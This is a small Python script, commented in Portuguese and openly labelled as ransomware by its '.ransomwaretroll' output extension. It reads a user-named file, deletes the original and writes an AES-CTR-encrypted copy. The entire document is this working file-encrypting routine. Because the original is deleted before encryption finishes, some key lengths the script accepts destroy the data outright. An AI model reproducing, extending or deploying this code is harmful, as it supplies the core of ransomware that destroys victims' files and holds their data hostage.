import os
import pyaes

def criptografar_arquivo(file_name, chave):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original após a leitura
        os.remove(file_name)
        
        # Criptografia com a chave fornecida
        key = chave.encode()  # Converter para bytes
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo criptografado
        new_file = file_name + ".ransomwaretroll"
        with open(new_file, 'wb') as new_file_obj:
            new_file_obj.write(crypto_data)

        print(f"Arquivo criptografado com sucesso: {new_file}")

    except FileNotFoundError:
        print(f"Erro: o arquivo {file_name} não foi encontrado.")
    except Exception as e:
        print(f"Ocorreu um erro: {str(e)}")

if __name__ == "__main__":
    # Receber o nome do arquivo e a chave de criptografia do usuário
    file_name = input("Digite o nome do arquivo a ser criptografado: ")
    chave = input("Digite a chave de criptografia (pelo menos 16 caracteres): ")

    # Verifica se a chave tem o tamanho adequado
    if len(chave) < 16:
        print("A chave deve ter pelo menos 16 caracteres!")
    else:
        # Chama a função de criptografia
        criptografar_arquivo(file_name, chave)
